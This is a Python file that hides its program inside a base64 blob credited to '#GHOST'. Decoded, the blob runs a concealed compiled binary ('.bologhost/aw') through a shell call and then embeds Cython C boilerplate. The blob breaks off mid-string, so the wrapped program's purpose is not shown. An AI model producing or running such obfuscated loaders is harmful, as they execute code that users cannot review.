# THIS ENCODE BY #GHOST | @GHOST_RFX
import os,base64
GHOST = b'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKcHJpbnQoIlx4MWJbMTs5Mm1ceDFiWzM4OzU7NDZtTE9BRElOR+KAouKAouKAoiIpCnByaW50KCcnKQpwcmludCgiXHgxYlsxOzkybVx4MWJbMzg7NTs1MG0jIyMjVEhJUyBJUyBFTkNPREVEIEJZICNHSE9TVCDigKIgQEdIT1NUX1JGWCIpCnByaW50KCcnKQpQUkVGSVg9c3lzLnByZWZpeApFWEVDVVRFX0ZJTEUgPSAiLmJvbG9naG9zdC9hdyIKRVhQT1JUX1BZVEhPTkhPTUUgPSJleHBvcnQgUFlUSE9OSE9NRT0iK3N5cy5wcmVmaXgKRVhQT1JUX1BZVEhPTl9FWEVDVVRBQkxFID0iZXhwb3J0IFBZVEhPTl9FWEVDVVRBQkxFPSIrIHN5cy5leGVjdXRhYmxlClJVTiA9ICIuLyIrIEVYRUNVVEVfRklMRQppZiBvcy5wYXRoLmlzZmlsZShFWEVDVVRFX0ZJTEUpOgogICAgb3Muc3lzdGVtKEVYUE9SVF9QWVRIT05IT01FICsiJiYiKyBFWFBPUlRfUFlUSE9OX0VYRUNVVEFCTEUgKyImJiIrIFJVTikKICAgIGV4aXQoMCkKQ19TT1VSQ0UgPSByIiIiCgojaWZuZGVmIFBZX1NTSVpFX1RfQ0xFQU4KI2RlZmluZSBQWV9TU0laRV9UX0NMRUFOCiNlbmRpZiAKCiNpZiBkZWZpbmVkKFB5X0xJTUlURURfQVBJKQogICNpZiAhZGVmaW5lZChDWVRIT05fTElNSVRFRF9BUEkpCiAgI2RlZmluZSBDWVRIT05fTElNSVRFRF9BUEkgMQogICNlbmRpZgojZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSkKICAjaWZkZWYgX01TQ19WRVIKICAjcHJhZ21hIG1lc3NhZ2UgKCJMaW1pdGVkIEFQSSB1c2FnZSBpcyBlbmFibGVkIHdpdGggJ0NZVEhPTl9MSU1JVEVEX0FQSScgYnV0ICdQeV9MSU1JVEVEX0FQSScgZG9lcyBub3QgZGVmaW5lIGEgUHl0aG9uIHRhcmdldCB2ZXJzaW9uLiBDb25zaWRlciBzZXR0aW5nICdQeV9MSU1JVEVEX0FQSScgaW5zdGVhZC4iKQogICNlbHNlCiAgI3dhcm5pbmcgTGltaXRlZCBBUEkgdXNhZ2UgaXMgZW5hYmxlZCB3aXRoICdDWVRIT05fTElNSVRFRF9BUEknIGJ1dCAnUHlfTElNSVRFRF9BUEknIGRvZXMgbm90IGRlZmluZSBhIFB5dGhvbiB0YXJnZXQgdmVyc2lvbi4gQ29uc2lkZXIgc2V0dGluZyAnUHlfTElNSVRFRF9BUEknIGluc3RlYWQuCiAgI2VuZGlmCiNlbmRpZgoKI2luY2x1ZGUgIlB5dGhvbi5oIgojaWZuZGVmIFB5X1BZVEhPTl9ICiAgICAjZXJyb3IgUHl0aG9uIGhlYWRlcnMgbmVlZGVkIHRvIGNvbXBpbGUgQyBleHRlbnNpb25zLCBwbGVhc2UgaW5zdGFsbCBkZXZlbG9wbWVudCB2ZXJzaW9uIG9mIFB5dGhvbi4KI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMDAwCiAgICAjZXJyb3IgQ3l0aG9uIHJlcXVpcmVzIFB5dGhvbiAzLjgrLgojZWxzZQojZGVmaW5lIF9fUFlYX0FCSV9WRVJTSU9OICIzXzFfNiIKI2RlZmluZSBDWVRIT05fSEVYX1ZFUlNJT04gMHgwMzAxMDZGMAojZGVmaW5lIENZVEhPTl9GVVRVUkVfRElWSVNJT04gMQoKI2luY2x1ZGUgPHN0ZGRlZi5oPgojaWZuZGVmIG9mZnNldG9mCiAgI2RlZmluZSBvZmZzZXRvZih0eXBlLCBtZW1iZXIpICggKHNpemVfdCkgJiAoKHR5cGUqKTApIC0+IG1lbWJlciApCiNlbmRpZgojaWYgIWRlZmluZWQoX1dJTjMyKSAmJiAhZGVmaW5lZChXSU4zMikgJiYgIWRlZmluZWQoTVNfV0lORE9XUykKICAjaWZuZGVmIF9fc3RkY2FsbAogICAgI2RlZmluZSBfX3N0ZGNhbGwKICAjZW5kaWYKICAjaWZuZGVmIF9fY2RlY2wKICAgICNkZWZpbmUgX19jZGVjbAogICNlbmRpZgogICNpZm5kZWYgX19mYXN0Y2FsbAogICAgI2RlZmluZSBfX2Zhc3RjYWxsCiAgI2VuZGlmCiNlbmRpZgojaWZuZGVmIERMX0lNUE9SVAogICNkZWZpbmUgRExfSU1QT1JUKHQpIHQKI2VuZGlmCiNpZm5kZWYgRExfRVhQT1JUCiAgI2RlZmluZSBETF9FWFBPUlQodCkgdAojZW5kaWYKI2RlZmluZSBfX1BZWF9DT01NQSAsCiNpZm5kZWYgSEFWRV9MT05HX0xPTkcKICAjZGVmaW5lIEhBVkVfTE9OR19MT05HCiNlbmRpZgojaWZuZGVmIFBZX0xPTkdfTE9ORwogICNkZWZpbmUgUFlfTE9OR19MT05HIExPTkdfTE9ORwojZW5kaWYKI2lmbmRlZiBQeV9IVUdFX1ZBTAogICNkZWZpbmUgUHlfSFVHRV9WQUwgSFVHRV9WQUwKI2VuZGlmCiNkZWZpbmUgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCBQWV9WRVJTSU9OX0hFWAojaWYgZGVmaW5lZChHUkFBTFZNX1BZVEhPTikKICAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDEKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMAogICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUAogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMAogICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUgogICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAwCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDEKICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUwogICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAxCiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMAogICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMAogICN1bmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDAKICAjdW5kZWYgQ1lUSE9OX0ZBU1RfR0lMCiAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMAogICN1bmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgMAogICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTEwKICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAwCiAgI2lmbmRlZiBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MKICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDEKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMQogICN1bmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMAogICN1bmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HCiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICNkZWZpbmUgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRSAwCiAgI3VuZGVmIENZVEhPTl9VU0VfQU1fU0VORAogICNkZWZpbmUgQ1lUSE9OX1VTRV9BTV9TRU5EIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TCiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMAogICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDEKICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MKICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAwCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAwCiNlbGlmIGRlZmluZWQoUFlQWV9WRVJTSU9OKQogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIDEKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMAogICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxCiAgI2lmbmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDAKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMAogICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMAogICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSCiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMgMAogICN1bmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMQogICN1bmRlZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDEKICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAwCiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAxCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDAKICAjdW5kZWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMAogICN1bmRlZiBDWVRIT05fRkFTVF9HSUwKICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAwCiAgI3VuZGVmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTAogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDAKICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUwogICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMQogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKICAgICN1bmRlZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUIDAKICAjZWxpZiAhZGVmaW5lZChDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQpCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwCiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcKICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgMAogICNpZm5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIChQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzBDMDApCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfQU1fU0VORAogICNkZWZpbmUgQ1lUSE9OX1VTRV9BTV9TRU5EIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TCiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMAogICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDAKICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MKICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAoUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMxMTAwKQogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMAojZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSkKICAjaWZkZWYgUHlfTElNSVRFRF9BUEkKICAgICN1bmRlZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYCiAgICAjZGVmaW5lIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggUHlfTElNSVRFRF9BUEkKICAjZW5kaWYKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAxCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDAKICAjdW5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSwogICNkZWZpbmUgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgMQogICN1bmRlZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAwCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAwCiAgI2lmbmRlZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMAogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAwCiAgI2lmbmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAwCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMAogICNlbmRpZgogICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TIDAKICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFIDAKICAjdW5kZWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgI2RlZmluZSBDWVRIT05fVU5QQUNLX01FVEhPRFMgMAogICN1bmRlZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAjZGVmaW5lIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURSAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTAogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIDAKICAjdW5kZWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjZGVmaW5lIENZVEhPTl9NRVRIX0ZBU1RDQUxMIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApCiAgI3VuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTAogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDAKICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUwogICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcKICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgMAogICNpZm5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIDAKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VU0VfQU1fU0VORAogICAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMCkKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TCiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMAogICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDAKICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MKICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAwCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAwCiNlbHNlCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDEKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCAwCiAgI2lmZGVmIFB5X0dJTF9ESVNBQkxFRAogICAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAxCiAgI2Vsc2UKICAgICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDAKICAgICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDEKICAjZWxpZiAhZGVmaW5lZChDWVRIT05fVVNFX1RZUEVfU0xPVFMpCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDAKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUAogICAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAxCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAwCiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTKQogICAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwogICAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDEKICAjZW5kaWYKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgfHwgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBBMgogICAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAwCiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUikKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAwCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDEKICAjZWxpZiAhZGVmaW5lZChDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTKQogICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDAKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQogICAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMQogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTAogICAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMAogICNlbGlmICFkZWZpbmVkKENZVEhPTl9GQVNUX0dJTCkKICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTYpCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fRkFTVF9QWUNBTEwKICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUwogICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgKFBZX1ZFUlNJT05fSEVYID49IDB